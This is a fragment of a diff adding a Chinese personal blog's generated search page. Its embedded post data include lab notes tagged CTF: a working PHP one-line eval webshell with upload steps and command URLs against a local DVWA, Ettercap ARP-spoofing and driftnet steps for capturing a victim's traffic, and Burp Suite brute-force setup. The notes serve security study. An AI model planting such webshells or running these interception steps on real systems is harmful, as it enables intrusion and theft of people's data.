+&lt;h3 id=&#34;步骤7完成打开网站&#34;&gt;步骤7：完成打开网站&lt;/h3&gt;
+">hugo+github博客搭建</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" href="https://tjx158589.github.io/post/about/"" data-c="
+          &lt;blockquote&gt;
+&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
+&lt;h2 id=&#34;博主是谁&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;
+&lt;h2 id=&#34;兴趣爱好&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;
+&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
+">关于</a>
+      </div>
+      
+    </div>
+  </div>
+</div>
+<script>
+  // var escape = "[{&#34;content&#34;:&#34;&lt;h1 id=\&#34;一句话木马webshell\&#34;&gt;一句话木马Webshell&lt;/h1&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_GET[command]);?&amp;gt;\n\n&amp;lt;?php @eval($_POST[command]);?&amp;gt;\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;木马上传\&#34;&gt;木马上传&lt;/h4&gt;\n&lt;blockquote&gt;\n&lt;p&gt;制作木马php&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg\&#34; alt=\&#34;image-20200709162716117\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;!-- more --&gt;\n&lt;img src=\&#34;/Users/oo/Library/Application Support/typora-user-images/image-20200709162819750.png\&#34; alt=\&#34;image-20200709162819750\&#34; style=\&#34;zoom:50%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;上传php文件&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkszvu6wmj31f80rcwhv.jpg\&#34; alt=\&#34;image-20200709163228706\&#34; style=\&#34;zoom: 33%;\&#34; /&gt;\n&lt;blockquote&gt;\n&lt;p&gt;检查是否上传成功&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;页面为空白说明php被服务器解析成功&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkt3wqvq3j31tc0o8go8.jpg\&#34; alt=\&#34;image-20200709163621768\&#34; style=\&#34;zoom: 33%;\&#34; /&gt;\n&lt;h4 id=\&#34;木马使用\&#34;&gt;木马使用&lt;/h4&gt;\n&lt;blockquote&gt;\n&lt;p&gt;木马利用方法1&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;http://127.0.0.1/hackable/uploads/shell.php?command=phpinfo();//打印服务器信息\n\nhttp://127.0.0.1/hackable/uploads/shell.php?command=system(%27ls%27);//终端   ls\n\n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;fileName&#34;:&#34;74DdnBfLO&#34;,&#34;abstract&#34;:&#34;&lt;h1 id=\&#34;一句话木马webshell\&#34;&gt;一句话木马Webshell&lt;/h1&gt;\n&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_GET[command]);?&amp;gt;\n\n&amp;lt;?php @eval($_POST[command]);?&amp;gt;\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h4 id=\&#34;木马上传\&#34;&gt;木马上传&lt;/h4&gt;\n&lt;blockquote&gt;\n&lt;p&gt;制作木马php&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg\&#34; alt=\&#34;image-20200709162716117\&#34; style=\&#34;zoom:50%;\&#34; /&gt;&#34;,&#34;title&#34;:&#34;一句话木马Webshell&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;CTF&#34;,&#34;slug&#34;:&#34;ctf&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://tjx158589.github.io/tag/ctf/&#34;}],&#34;date&#34;:&#34;2021-01-26 11:52:53&#34;,&#34;dateFormat&#34;:&#34;2021-01-26&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/74DdnBfLO/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:27000,&#34;words&#34;:101,&#34;minutes&#34;:1},&#34;description&#34;:&#34;一句话木马Webshell\n&amp;lt;?php @eval($_GET[command]);?&amp;gt;\n\n&amp;lt;?php @eval($_POST[command]);?&amp;gt;\n\n\n木马上传\n\n制作木马php\n\n\n\n\n\n上传php文件\n\n...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%ACwebshell\&#34;&gt;一句话木马Webshell&lt;/a&gt;&lt;br&gt;\n*&lt;br&gt;\n*&lt;br&gt;\n* &lt;a href=\&#34;#%E6%9C%A8%E9%A9%AC%E4%B8%8A%E4%BC%A0\&#34;&gt;木马上传&lt;/a&gt;&lt;br&gt;\n* &lt;a href=\&#34;#%E6%9C%A8%E9%A9%AC%E4%BD%BF%E7%94%A8\&#34;&gt;木马使用&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h3 id=\&#34;1-火狐代理安装\&#34;&gt;1、火狐代理安装&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;firefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1ggkm3nd4xjj30vm0g2myc.jpg\&#34; alt=\&#34;image-20200709123227751\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/blockquote&gt;\n&lt;!-- more --&gt;\n&lt;h5 id=\&#34;火狐中文设置\&#34;&gt;火狐中文设置&lt;/h5&gt;\n&lt;pre&gt;&lt;code&gt;preference - language - search more language - chinese - add - 选择 - 重启浏览器\n&lt;/code&gt;&lt;/pre&gt;\n&lt;blockquote&gt;\n&lt;p&gt;1.保证DVWA设置为low安全等级&lt;/p&gt;\n&lt;p&gt;2.拦截正确的数据包 要在数据包中能看到自己输入的用户名密码值&lt;/p&gt;\n&lt;p&gt;3.发送到Intruder 在position中clear add密码字段&lt;/p&gt;\n&lt;p&gt;4.load 载入txt文件&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h3 id=\&#34;3-burp-suite-https-证书\&#34;&gt;3、burp suite   https 证书&lt;/h3&gt;\n&lt;h5 id=\&#34;1-下载证书\&#34;&gt;1、下载证书&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;proxy模式   访问http://burp/&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp31xaqxj31340lktag.jpg\&#34; alt=\&#34;image-20200709141708731\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h5 id=\&#34;2-证书安装\&#34;&gt;2、证书安装&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;选择Open menu -&amp;gt;Preferences -&amp;gt;Privacy &amp;amp; Security下的View Certificates&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp59nm3fj31e50u0the.jpg\&#34; alt=\&#34;image-20200709141915455\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;blockquote&gt;\n&lt;p&gt;导入证书&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;4\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkp64qp25j30wb0u0n06.jpg\&#34; alt=\&#34;image-20200709142005940\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&#34;,&#34;fileName&#34;:&#34;4tkAOajCp&#34;,&#34;abstract&#34;:&#34;&lt;h3 id=\&#34;1-火狐代理安装\&#34;&gt;1、火狐代理安装&lt;/h3&gt;\n&lt;blockquote&gt;\n&lt;p&gt;firefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://tva1.sinaimg.cn/large/007S8ZIlly1ggkm3nd4xjj30vm0g2myc.jpg\&#34; alt=\&#34;image-20200709123227751\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;/blockquote&gt;\n&#34;,&#34;title&#34;:&#34;burpsuite 抓包练习&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;CTF&#34;,&#34;slug&#34;:&#34;ctf&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://tjx158589.github.io/tag/ctf/&#34;}],&#34;date&#34;:&#34;2021-01-26 11:51:51&#34;,&#34;dateFormat&#34;:&#34;2021-01-26&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/4tkAOajCp/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:35000,&#34;words&#34;:141,&#34;minutes&#34;:1},&#34;description&#34;:&#34;1、火狐代理安装\n\nfirefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装\n\n\n\n火狐中文设置\npreference - language - search more language -...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1-%E7%81%AB%E7%8B%90%E4%BB%A3%E7%90%86%E5%AE%89%E8%A3%85\&#34;&gt;1、火狐代理安装&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%81%AB%E7%8B%90%E4%B8%AD%E6%96%87%E8%AE%BE%E7%BD%AE\&#34;&gt;火狐中文设置&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#3-burp-suite-https-%E8%AF%81%E4%B9%A6\&#34;&gt;3、burp suite   https 证书&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1-%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6\&#34;&gt;1、下载证书&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#2-%E8%AF%81%E4%B9%A6%E5%AE%89%E8%A3%85\&#34;&gt;2、证书安装&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h1 id=\&#34;driftnet学习笔记\&#34;&gt;Driftnet学习笔记&lt;/h1&gt;\n&lt;h2 id=\&#34;一-工具介绍\&#34;&gt;一、工具介绍&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;此篇应与 ettercap ARP欺骗相互配合观看。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h4 id=\&#34;命令介绍\&#34;&gt;命令介绍&lt;/h4&gt;\n&lt;h4 id=\&#34;命令原型\&#34;&gt;命令原型&lt;/h4&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cmd\&#34;&gt;driftnet  [options]  [filter code] \n&lt;/code&gt;&lt;/pre&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;&lt;strong&gt;参数命令&lt;/strong&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;&lt;code&gt;-b&lt;/code&gt; ：捕获到新的图片时发出嘟嘟声&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-i interface&lt;/code&gt; ：选择监听接口&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-f file&lt;/code&gt;：读取一个指定pcap数据包中的图片&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-p&lt;/code&gt; ：不让所监听的接口使用混杂模式&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-a&lt;/code&gt; ：后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-m number&lt;/code&gt; ：指定保存图片数的数目&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-d directory&lt;/code&gt; ：指定保存图片的路径&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;-x prefix&lt;/code&gt;：指定保存图片的前缀名&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h4 id=\&#34;命令示例\&#34;&gt;命令示例&lt;/h4&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cmd\&#34;&gt;# driftnet -i eth0 -d /root/ \n\n/*\n\n   因为我们是配合ettercap 进行ARP欺骗，所以所有的被害者流量都会从\n\n  我方端口经过（有线），所以端口为eth0.\n\n*/\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h2 id=\&#34;二-ettercap-进行arp欺骗-实验笔记\&#34;&gt;二、Ettercap 进行ARP欺骗 实验笔记&lt;/h2&gt;\n&lt;h3 id=\&#34;实验需求\&#34;&gt;实验需求&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;​    攻击机与被攻击机位于同一局域网内&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;​    此实验中，攻击机为 Kali Linux&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;​    被攻击机为 苹果手机 与 Win7虚拟机&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h3 id=\&#34;实验步骤\&#34;&gt;实验步骤&lt;/h3&gt;\n&lt;h5 id=\&#34;打开-ettercap\&#34;&gt;打开 Ettercap&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;Ettercap 支持&lt;em&gt;命令行&lt;/em&gt;与&lt;em&gt;图形界面&lt;/em&gt; 双模式，但其图形界面很优美，故我们选用图形界面。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cmd\&#34;&gt;# ettercap -G \n\n /* 该命令打开 Ettercap 的（GTK+ GUI）*/\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h5 id=\&#34;确定监听网卡\&#34;&gt;确定监听网卡&lt;/h5&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;选择 Sniff —- Unified-sniffing ，然后选择网卡。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;在这里，我们用有线攻击局域网内目标。故选择 eth0。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;当然我们还可以，点击下拉箭头，打开网卡备选。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;点击确定。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h5 id=\&#34;扫描局域网内全部主机\&#34;&gt;扫描局域网内全部主机&lt;/h5&gt;\n&lt;p&gt;​\t Hosts — Scan for hosts — Hosts list。这时，就可以看到局域网内所有的主机。&lt;/p&gt;\n&lt;h5 id=\&#34;选定目标\&#34;&gt;选定目标&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;在列表里面，选定目标主机，然后点add to target 1,将目标主机添加到目标1;&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;在列表里面，选定路由，点add to target 2,将路由添加到目标2：&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;PS.路由就是我们的网关，可以用 ifconfig 来查看。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/blockquote&gt;\n&lt;h5 id=\&#34;选择攻击方式\&#34;&gt;选择攻击方式&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;然后点 mitm — arp posoning ，勾选 sniff remote connections：&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h5 id=\&#34;开始攻击\&#34;&gt;开始攻击&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;点击start — start sniffing开始监听。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h5 id=\&#34;密码解析\&#34;&gt;密码解析&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;其中如果被劫持的主机访问一些比较明显的用户名和密码，Ettercap就会自己显现在屏幕上。但是，现在的网络环境下，很少是明文传输。很多都是MD5加密。可以在线破解。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h4 id=\&#34;拓展\&#34;&gt;拓展&lt;/h4&gt;\n&lt;h5 id=\&#34;获取图片流\&#34;&gt;获取图片流&lt;/h5&gt;\n&lt;blockquote&gt;\n&lt;p&gt;我们用 driftnet 工具。&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre&gt;&lt;code&gt;driftnet -i eth0 -d /root/ \n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;fileName&#34;:&#34;dg16Ph5CE&#34;,&#34;abstract&#34;:&#34;&lt;h1 id=\&#34;driftnet学习笔记\&#34;&gt;Driftnet学习笔记&lt;/h1&gt;\n&lt;h2 id=\&#34;一-工具介绍\&#34;&gt;一、工具介绍&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;\n&lt;p&gt;driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;此篇应与 ettercap ARP欺骗相互配合观看。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h4 id=\&#34;命令介绍\&#34;&gt;命令介绍&lt;/h4&gt;\n&lt;h4 id=\&#34;命令原型\&#34;&gt;命令原型&lt;/h4&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cmd\&#34;&gt;driftnet  [options]  [filter code] \n&lt;/code&gt;&lt;/pre&gt;\n&#34;,&#34;title&#34;:&#34;Driftnet学习笔记&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;CTF&#34;,&#34;slug&#34;:&#34;ctf&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://tjx158589.github.io/tag/ctf/&#34;}],&#34;date&#34;:&#34;2021-01-26 11:50:06&#34;,&#34;dateFormat&#34;:&#34;2021-01-26&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://tjx158589.github.io/post/dg16Ph5CE/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;3 min read&#34;,&#34;time&#34;:144000,&#34;words&#34;:650,&#34;minutes&#34;:3},&#34;description&#34;:&#34;Driftnet学习笔记\n一、工具介绍\n\n\ndriftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。\n\n\n这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。\n\n\n此篇应与 etterca...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;&lt;a href=\&#34;#driftnet%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0\&#34;&gt;Driftnet学习笔记&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%80-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D\&#34;&gt;一、工具介绍&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D\&#34;&gt;命令介绍&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%91%BD%E4%BB%A4%E5%8E%9F%E5%9E%8B\&#34;&gt;命令原型&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%91%BD%E4%BB%A4%E7%A4%BA%E4%BE%8B\&#34;&gt;命令示例&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%BA%8C-ettercap-%E8%BF%9B%E8%A1%8Carp%E6%AC%BA%E9%AA%97-%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0\&#34;&gt;二、Ettercap 进行ARP欺骗 实验笔记&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%9E%E9%AA%8C%E9%9C%80%E6%B1%82\&#34;&gt;实验需求&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4\&#34;&gt;实验步骤&lt;/a&gt;&lt;br&gt;\n*\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%89%93%E5%BC%80-ettercap\&#34;&gt;打开 Ettercap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%A1%AE%E5%AE%9A%E7%9B%91%E5%90%AC%E7%BD%91%E5%8D%A1\&#34;&gt;确定监听网卡&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E5%85%A8%E9%83%A8%E4%B8%BB%E6%9C%BA\&#34;&gt;扫描局域网内全部主机&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%80%89%E5%AE%9A%E7%9B%AE%E6%A0%87\&#34;&gt;选定目标&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E9%80%89%E6%8B%A9%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F\&#34;&gt;选择攻击方式&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%BC%80%E5%A7%8B%E6%94%BB%E5%87%BB\&#34;&gt;开始攻击&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E5%AF%86%E7%A0%81%E8%A7%A3%E6%9E%90\&#34;&gt;密码解析&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%8B%93%E5%B1%95\&#34;&gt;拓展&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%8E%B7%E5%8F%96%E5%9B%BE%E7%89%87%E6%B5%81\&#34;&gt;获取图片流&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;h2 id=\&#34;第一章\&#34;&gt;第一章&lt;/h2&gt;\n&lt;h4 id=\&#34;讲述计算机的发展历程\&#34;&gt;讲述计算机的发展历程&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;机械计算器（1930以前）&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;电子计算机的诞生（1930-1950）&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;早起电子计算机&lt;/li&gt;\n&lt;li&gt;基于冯洛伊曼模型的计算机&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;计算机的诞生（1950—今）&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;计算机有哪些特点\&#34;&gt;计算机有哪些特点&lt;/h4&gt;\n&lt;!-- more --&gt;\n&lt;ol&gt;\n&lt;li&gt;快速的运算能力&lt;/li&gt;\n&lt;li&gt;足够高的计算精度&lt;/li&gt;\n&lt;li&gt;复杂的逻辑判断能力&lt;/li&gt;\n&lt;li&gt;按程序自动工作的能力&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;简述计算机科学的定义及其根本问题\&#34;&gt;简述计算机科学的定义及其根本问题&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;定义：信息处理的机器。信息的传输、储存、加工的机器&lt;/li&gt;\n&lt;li&gt;根本问题\n&lt;ol&gt;\n&lt;li&gt;理论：理论是数学科学的根本。&lt;/li&gt;\n&lt;li&gt;抽象：抽象（模型化）是自然科学的根本。&lt;/li&gt;\n&lt;li&gt;设计：设计是工程的根本。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;简述计算机科学与技术专业知识体系\&#34;&gt;简述计算机科学与技术专业知识体系&lt;/h4&gt;\n&lt;p&gt;​\t\t数学基础、编程语言、编程思想、数据结构、算法能力、计算机网络、操作系统、数据库、编译原理、计算机组成&lt;/p&gt;\n&lt;h4 id=\&#34;简述计算机科学与技术学科的三个学科形态\&#34;&gt;简述计算机科学与技术学科的三个学科形态&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;理论：理论是数学科学的根本。&lt;/li&gt;\n&lt;li&gt;抽象：抽象（模型化）是自然科学的根本。&lt;/li&gt;\n&lt;li&gt;设计：设计是工程的根本。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h2 id=\&#34;第二章\&#34;&gt;第二章&lt;/h2&gt;\n&lt;h4 id=\&#34;简述图灵机模型的基本思想\&#34;&gt;简述图灵机模型的基本思想&lt;/h4&gt;\n&lt;p&gt;图灵的基本思想是用机器来模拟人们用纸笔进行数学运算的过程，他把这样的过程看作下列两种简单的动作:&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;在纸上写上或擦除某个符号;&lt;/li&gt;\n&lt;li&gt;把注意力从纸的一个位置移动到另一个位置;&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;简述冯诺依曼型计算机的基本思想\&#34;&gt;简述冯诺依曼型计算机的基本思想&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;计算机应该由运算器、控制器、存储器、输入设备和输出设备五个基本部件组成。&lt;/li&gt;\n&lt;li&gt;各个基本部件的功能是：\n&lt;ol&gt;\n&lt;li&gt;存储器不仅能存放数据，也能存放指令，形式上两者没有区别，但计算机应能区分数据还是指令；&lt;/li&gt;\n&lt;li&gt;控制器应能自动取出指令来执行&lt;/li&gt;\n&lt;li&gt;运算器应能进行加减乘除四种基本算术运算，并且也能进行一些逻辑运算和附加运算；&lt;/li&gt;\n&lt;li&gt;操作人员可以通过输入设备、输出设备和主机进行通信。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;/li&gt;\n&lt;li&gt;内部以二进制表示指令和数据。每条指令由操作码和地址码两部分组成。操作码指出操作类型（加、减法、跳转、传送等），地址码指出操作数的地址。由一串指令组成程序。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;p&gt;4.采用“存储程序”工作方式。&lt;/p&gt;\n&lt;h4 id=\&#34;汉字编码有哪几类列出几种常见的输入码\&#34;&gt;汉字编码有哪几类？列出几种常见的输入码&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;外码、交换码、机内码、字形码和地址码&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;常见输入码&lt;/p&gt;\n&lt;p&gt;拼音码、五笔字型码、自然码、表形码、认知码、区位码和电报码&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 id=\&#34;定点表示法和浮点表示法各有什么特点\&#34;&gt;定点表示法和浮点表示法各有什么特点&lt;/h4&gt;\n&lt;ol&gt;\n&lt;li&gt;定点表示法：指小数点在数中的位置是固定不变的，通常有定点整数和定点小数。&lt;/li&gt;\n&lt;li&gt;浮点表示法：浮点数中小数点的位置是不固定的，用阶码和尾数来表示。&lt;/li&gt;\n&lt;/ol&gt;\n&lt;h4 